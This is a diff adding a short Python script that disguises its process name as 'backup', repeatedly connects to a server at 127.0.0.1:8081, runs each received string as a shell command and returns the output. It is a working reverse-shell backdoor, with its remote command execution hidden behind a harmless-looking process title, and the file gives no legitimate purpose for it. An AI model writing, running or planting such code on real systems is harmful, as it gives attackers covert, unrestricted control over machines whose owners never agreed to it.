@@ -1,0 +1,49 @@
+import os 
+import psutil
+import socket
+import subprocess
+import setproctitle
+from time import sleep
+
+setproctitle.setproctitle("backup")
+
+HOST = "127.0.0.1"
+PORT = 8081
+
+s = socket.socket()
+
+connected = False
+
+def main():
+    global connected
+    while True:
+        while (connected == False):
+            try:
+                s.connect((HOST,PORT))
+                print("[Backup] Successfully Connected to Server")
+                connected = True
+            except ConnectionRefusedError:
+                print("[Backup] Connection failed, retrying")
+                sleep(5)
+        while (connected == True):
+            data = s.recv(1024).decode()
+            if (data != ""):
+                print("[Backup] Server: " + data)
+                try:
+                    result = subprocess.check_output(
+                        data,
+                        stderr=subprocess.STDOUT,
+                        shell=True,
+                        text=True,
+                        universal_newlines=True
+                    )
+                except subprocess.CalledProcessError as exc:
+                    s.send(exc.output.encode())
+                else:
+                    if (result == None or result == ""):
+                        s.send("Success".encode())
+                    else:
+                        s.send(result.encode())
+
+if __name__ == "__main__":
+    main()
